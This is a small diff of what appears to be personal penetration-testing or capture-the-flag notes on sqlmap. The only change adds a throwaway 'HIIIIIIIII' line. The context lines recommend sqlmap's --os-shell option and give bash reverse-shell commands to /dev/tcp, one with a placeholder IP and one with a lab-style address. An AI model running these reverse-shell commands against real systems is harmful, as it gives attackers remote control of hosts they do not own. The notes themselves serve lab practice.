@@ -13,3 +13,10 @@ and keep in your mind the --os-shell option ==> use it to gain the bash reverse 
 os-shell>       bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
 
 --os-cmd 'bash -c "bash -i >& /dev/tcp/10.10.16.4/1234 0>&1"'
+
+
+
+
+
+
+HIIIIIIIII 
